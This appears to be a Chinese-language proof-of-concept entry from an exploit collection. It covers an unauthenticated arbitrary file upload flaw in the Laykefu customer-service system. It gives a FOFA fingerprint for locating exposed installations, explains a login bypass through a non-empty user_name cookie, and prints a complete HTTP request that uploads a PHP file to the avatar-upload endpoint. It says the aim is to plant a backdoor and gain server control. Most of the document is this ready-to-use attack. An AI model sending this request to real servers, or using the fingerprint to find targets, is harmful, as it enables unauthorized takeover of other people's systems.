## Laykefu客服系统任意文件上传漏洞

Laykefu客服系统/admin/users/upavatar.html接口处存在文件上传漏洞，而且当请求中Cookie中的”user_name“不为空时即可绕过登录系统后台，未经身份验证的攻击者可利用此问题，上传后门文件，获取服务器权限。

## fofa
```
icon_hash="-334624619"
```

## poc
```
POST /admin/users/upavatar.html HTTP/1.1
Host: xxx.xxx.xxx
Content-Length: 194
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR
Origin: http://xxx.xxx.xxx
Referer: http://xxx.xxx.xxx/admin/users/edituser/id/1.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user_name=1; user_id=3
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Connection: close

------WebKitFormBoundary3OCVBiwBVsNuB2kR
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundary3OCVBiwBVsNuB2kR--
```
![44dcbdbc80e1e61fca16aff0516cf6c0](https://github.com/wy876/POC/assets/139549762/414797a3-6eb4-4466-a79e-9806adf1c8be)

![d0aeeb4590a1dd0ce9402db1a7888177](https://github.com/wy876/POC/assets/139549762/ad84b8aa-5358-4fb1-881c-edda45b69eb1)
